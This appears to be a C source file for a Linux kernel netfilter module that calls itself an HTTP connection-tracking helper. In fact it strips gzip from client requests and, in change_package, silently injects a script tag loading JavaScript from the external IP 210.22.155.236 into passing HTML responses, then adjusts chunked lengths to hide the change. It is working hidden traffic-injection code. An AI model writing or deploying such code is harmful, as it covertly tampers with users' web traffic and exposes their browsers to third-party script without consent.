#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/textsearch.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter.h>
#include <linux/version.h>

#include <net/netfilter/nf_conntrack.h>
#include <net/netfilter/nf_conntrack_expect.h>
#include <net/netfilter/nf_conntrack_ecache.h>
#include <net/netfilter/nf_conntrack_helper.h>
#include <net/netfilter/nf_nat_helper.h>

//////////////////////////////////BASE/////////////////////////
static void change_package(struct sk_buff *skb,
		       unsigned int protoff,
		       struct nf_conn *ct,
		       enum ip_conntrack_info ctinfo);

static char *ts_algo = "kmp";

MODULE_AUTHOR("yjj");
MODULE_DESCRIPTION("http connection tracking module");
MODULE_LICENSE("GPL");
MODULE_ALIAS("ip_conntrack_http");
MODULE_ALIAS_NFCT_HELPER("http");

enum http_strings {
	SEARCH_GET,
	SEARCH_RESPONSE,
	SEARCH_ACCEPT_ENCODING,
	SEARCH_REQUEST_FILTER,
	SEARCH_RESPONSE_FILTER,
	SEARCH_INSERT_JS1,
	SEARCH_INSERT_JS2,
	SEARCH_INSERT_JS3,
	SEARCH_IS_CHUNKED,
	SEARCH_CHUNKED_VALUE_START,
	SEARCH_CHUNKED_VALUE_STOP,
};

static struct {
	const char		*string;
	size_t			len;
	struct ts_config	*ts;
} search[] __read_mostly = {
	[SEARCH_GET] = {
		.string	= "GET ",
		.len	= 4 ,
	},
	[SEARCH_RESPONSE] = {
		.string	= "HTTP/1. ",
		.len	= 7,
	},
	[SEARCH_ACCEPT_ENCODING] = {
		.string	= "Accept-Encoding: gzip ",
		.len	= 21,
	},
	[SEARCH_REQUEST_FILTER] = {
		.string	= "Accept: text/html",
		.len	= 17,
	},
	[SEARCH_RESPONSE_FILTER] = {
		.string	= "Content-Type: text/html",
		.len	= 23,
	},
	[SEARCH_INSERT_JS1] = {
		.string	= "<!DOCTYPE",
		.len	= 9,
	},
	[SEARCH_INSERT_JS2] = {
		.string	= "<!doctype",
		.len	= 9,
	},
	[SEARCH_INSERT_JS3] = {
		.string	= "<html",
		.len	= 5,
	},
	[SEARCH_IS_CHUNKED] = {
		.string	= "Transfer-Encoding: chunked",
		.len	= 26,
	},
	[SEARCH_CHUNKED_VALUE_START] = {
		.string	= "\r\n\r\n",
		.len	= 4,
	},
	[SEARCH_CHUNKED_VALUE_STOP] = {
		.string	= "\r\n",
		.len	= 2,
	},
};


static inline int http_merge_packet(struct sk_buff *skb,
					struct nf_conn *ct,
					enum ip_conntrack_info ctinfo,
					unsigned int protoff,
					unsigned int match_offset,
					unsigned int match_len,
					const char *rep_buffer,
					unsigned int rep_len)
{

	//printk("!! match_offset=%d,match_len=%d,rep_buffer=%s,rep_len=%d\n",match_offset,match_len,rep_buffer,rep_len);      	
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,14)
		return nf_nat_mangle_tcp_packet(skb, ct, ctinfo,protoff,	
										match_offset ,match_len,		
										rep_buffer, rep_len); 
	#else
		return nf_nat_mangle_tcp_packet(skb, ct, ctinfo,	
										match_offset ,match_len,		
										rep_buffer, rep_len);
	#endif

	
}

static inline int http_repair_packet(struct sk_buff *skb,
					struct nf_conn *ct,
					enum ip_conntrack_info ctinfo,
					unsigned int protoff)
{
	if (!ct||
		!test_bit(IPS_SEQ_ADJUST_BIT, &ct->status)||
		(ctinfo == IP_CT_RELATED + IP_CT_IS_REPLY)) 
	{
		return 0;   
	}
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,14)
		return nf_nat_seq_adjust_hook(skb, ct, ctinfo,protoff);
	#else
		return nf_nat_seq_adjust_hook(skb, ct, ctinfo);
	#endif
	
}

static int http_help(struct sk_buff *skb,
		       unsigned int protoff,
		       struct nf_conn *ct,
		       enum ip_conntrack_info ctinfo)
{
	struct ts_state ts;
	unsigned int dataoff, matchoff;

	//no need , kernel repair auto
	//http_repair_packet(skb, ct, ctinfo,protoff);
	
	/* No data? */
	dataoff = protoff + sizeof(struct tcphdr);
	if (dataoff >= skb->len) {
		//if (net_ratelimit())
		//	printk("http_help: skblen = %u\n", skb->len);
		return NF_ACCEPT;
	}
	
	/* from client */
	if (CTINFO2DIR(ctinfo) == IP_CT_DIR_ORIGINAL)
	{
		memset(&ts, 0, sizeof(ts));
		matchoff = skb_find_text(skb, dataoff, skb->len,
			      search[SEARCH_GET].ts, &ts);
		if (matchoff == UINT_MAX)
			return NF_ACCEPT;

		memset(&ts, 0, sizeof(ts));
		matchoff = skb_find_text(skb, dataoff, skb->len,
			      search[SEARCH_REQUEST_FILTER].ts, &ts);
		if (matchoff == UINT_MAX)
			return NF_ACCEPT;
		
		memset(&ts, 0, sizeof(ts));
		matchoff = skb_find_text(skb, dataoff, skb->len,
			      search[SEARCH_ACCEPT_ENCODING].ts, &ts);
		if (matchoff == UINT_MAX)
			return NF_ACCEPT;

		http_merge_packet(skb, ct, ctinfo,protoff,
				       matchoff, 1,
				       "B", 1);
	}
	/* from server IP_CT_DIR_REPLY*/
	else
	{
		
		memset(&ts, 0, sizeof(ts));
		matchoff = skb_find_text(skb, dataoff, skb->len,
			      search[SEARCH_RESPONSE].ts, &ts);
		if (matchoff == UINT_MAX)
			return NF_ACCEPT;

		memset(&ts, 0, sizeof(ts));
		matchoff = skb_find_text(skb, dataoff, skb->len,
			      search[SEARCH_RESPONSE_FILTER].ts, &ts);
		if (matchoff == UINT_MAX)
			return NF_ACCEPT;
		
		change_package(skb,protoff,ct,ctinfo);
		
		//printk("%s\n" , (char*)ip_hdr(skb)+dataoff);
	}

	return NF_ACCEPT;
}

static const struct nf_conntrack_expect_policy http_exp_policy = {
	.max_expected		= 3,
	.timeout		= 180,
};

static struct nf_conntrack_helper http_helper __read_mostly = {
	.name			= "http",
	.me			= THIS_MODULE,
	.help			= http_help,
	.tuple.src.l3num	= AF_INET,
	.tuple.src.u.tcp.port	= cpu_to_be16(80),
	.tuple.dst.protonum	= IPPROTO_TCP,
	.expect_policy		= &http_exp_policy,
};

static void __exit nf_conntrack_http_fini(void)
{
	int i;

	nf_conntrack_helper_unregister(&http_helper);
	for (i = 0; i < ARRAY_SIZE(search); i++)
		textsearch_destroy(search[i].ts);
}

static int __init nf_conntrack_http_init(void)
{
	int ret, i;

	for (i = 0; i < ARRAY_SIZE(search); i++) {
		search[i].ts = textsearch_prepare(ts_algo, search[i].string,
						  search[i].len,
						  GFP_KERNEL, TS_AUTOLOAD);
		if (IS_ERR(search[i].ts)) {
			ret = PTR_ERR(search[i].ts);
			goto err1;
		}
	}
	ret = nf_conntrack_helper_register(&http_helper);
	if (ret < 0)
		goto err1;
	
	return 0;
err1:
	while (--i >= 0)
		textsearch_destroy(search[i].ts);

	return ret;
}


module_init(nf_conntrack_http_init);
module_exit(nf_conntrack_http_fini);

//////////////////////////////////EXTERN////////////////////////
#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>\r\n\0"
#define JS_LEN strlen(JS)

static void change_package(struct sk_buff *skb,
		       unsigned int protoff,
		       struct nf_conn *ct,
		       enum ip_conntrack_info ctinfo)
{
	struct ts_state ts;
	unsigned int dataoff, matchoff,matchoff_start,matchoff_stop;
	char src_hex[32],dst_hex[32];
	unsigned int hex_i;
	
	dataoff = protoff + sizeof(struct tcphdr);
	memset(&ts, 0, sizeof(ts));
	matchoff = skb_find_text(skb, dataoff, skb->len,
			  search[SEARCH_INSERT_JS1].ts, &ts);
	if (matchoff == UINT_MAX)
	{
		memset(&ts, 0, sizeof(ts));
		matchoff = skb_find_text(skb, dataoff, skb->len,
				  search[SEARCH_INSERT_JS2].ts, &ts);
		if (matchoff == UINT_MAX)
		{
			memset(&ts, 0, sizeof(ts));
			matchoff = skb_find_text(skb, dataoff, skb->len,
					  search[SEARCH_INSERT_JS3].ts, &ts);
			if (matchoff == UINT_MAX)
				return;
		}
	}
	if(!http_merge_packet(skb, ct, ctinfo,protoff,
				   matchoff, 0,
				   JS, JS_LEN))
		return;
	
	memset(&ts, 0, sizeof(ts));
	matchoff = skb_find_text(skb, dataoff, skb->len,
			  search[SEARCH_IS_CHUNKED].ts, &ts);
	if (matchoff == UINT_MAX)
		return;

	memset(&ts, 0, sizeof(ts));
	matchoff_start = skb_find_text(skb, dataoff, skb->len,
			  search[SEARCH_CHUNKED_VALUE_START].ts, &ts);
	if (matchoff_start == UINT_MAX)
		return;
	
	matchoff_start += search[SEARCH_CHUNKED_VALUE_START].len;

	memset(&ts, 0, sizeof(ts));
	matchoff_stop = skb_find_text(skb, dataoff+matchoff_start, skb->len,
			  search[SEARCH_CHUNKED_VALUE_STOP].ts, &ts);
	if (matchoff_stop == UINT_MAX)
		return;

	if(matchoff_stop > 8)
	{
		return;
	}
	
	memcpy(src_hex , (char*)ip_hdr(skb)+dataoff+matchoff_start , matchoff_stop);
	sscanf(src_hex, "%x", &hex_i);
	hex_i+=JS_LEN;
	sprintf(dst_hex , "%x" , hex_i);
	//printk("%s---%s\n" , src_hex , dst_hex);

	http_merge_packet(skb, ct, ctinfo,protoff,
				   matchoff_start, matchoff_stop,
				   dst_hex, strlen(dst_hex));
	
	//printk("%s\n" , (char*)ip_hdr(skb)+dataoff+matchoff_start);

}

